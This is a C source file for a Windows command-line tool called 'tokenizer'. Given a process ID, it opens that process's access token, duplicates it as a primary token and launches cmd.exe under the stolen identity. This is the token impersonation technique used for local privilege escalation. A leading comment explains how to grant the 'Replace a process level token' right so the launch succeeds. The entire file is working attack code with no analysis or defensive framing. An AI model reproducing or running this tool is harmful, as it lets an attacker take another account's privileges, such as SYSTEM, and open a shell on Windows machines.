/*
If you encounter Error 1314 when attempting to create a new process, follow these steps to resolve the issue:
1. Open the Control Panel.
2.Navigate to "Administrative Tools" and then select "Local Security Policy."
3. In the Local Security Policy window, locate and select the "Replace a process level token" right.
4. Add the user account experiencing the issue to the list of users granted this right.
By doing so, you ensure that the specified user account has the necessary permissions to replace a process-level token, addressing the Error 1314 during the new process creation.
*/

#include<windows.h>
#include<stdio.h>

int main(int argc, LPCSTR argv[])
{
    if (argc != 2)
    {
        printf("\nUsage: tokenizer <PID>\n");
        return 1;
    }
    DWORD pid = atoi(argv[1]);


    // Access the token of the target process
    HANDLE targetProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
    if (!targetProcess)
    {
        printf("Unable to open target process ID %d \n", pid);
        return 2;
    }
    printf("Target Process is opened\n");

    HANDLE targetProcessToken = NULL;
    if (!OpenProcessToken(targetProcess, TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY | TOKEN_IMPERSONATE, &targetProcessToken))
    {
        printf("Unbale to open process token!\n");
        return 3;
    }
    printf("Target Process Token Opened Succesfully\nPid :: %d \n", pid);

    // The following is necessary for invoking DuplicateTokenEx
    SECURITY_IMPERSONATION_LEVEL seImpersonateLevel = SecurityImpersonation; // the level we wish to have
    TOKEN_TYPE tokenType = TokenPrimary;
    HANDLE newTokenHandle = new HANDLE;

    if (!DuplicateTokenEx(targetProcessToken, MAXIMUM_ALLOWED, NULL, seImpersonateLevel, tokenType, &newTokenHandle))
    {
        printf("Unable to Duplicate Token. Error %d\n", GetLastError());
        return 4;
    }
    printf("Token Is Successfully Duplicated!\n");

   

    STARTUPINFOA si = {};
    PROCESS_INFORMATION pi = {};
    LPSTR processToCreate = _strdup("C:\\Windows\\system32\\cmd.exe");

    if (!CreateProcessAsUserA(newTokenHandle, NULL, processToCreate, NULL, NULL, TRUE, CREATE_NEW_CONSOLE, NULL, "c:\\", &si, &pi))
    {
        printf("\n Failed Creating New Process. Error: %d", GetLastError());
        return 6;
    }
    CloseHandle(targetProcess);
    CloseHandle(newTokenHandle);
    CloseHandle(targetProcessToken);
    return 0;
}